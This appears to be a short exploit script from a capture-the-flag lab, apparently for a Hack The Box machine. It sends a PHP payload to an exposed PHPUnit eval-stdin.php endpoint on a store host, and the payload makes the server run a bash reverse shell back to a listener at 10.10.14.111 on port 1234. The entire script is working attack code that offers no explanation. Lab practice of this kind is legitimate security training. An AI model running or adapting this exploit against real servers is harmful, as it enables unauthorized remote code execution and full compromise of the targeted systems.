ATTACKING_IP="10.10.14.111"
ATTACKING_PORT="1234"

CMD="bash -c 'bash -i >& /dev/tcp/$ATTACKING_IP/$ATTACKING_PORT 0>&1'"

curl  -s \
      http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php \
      --data "<?php system(\"$CMD\") ?>"
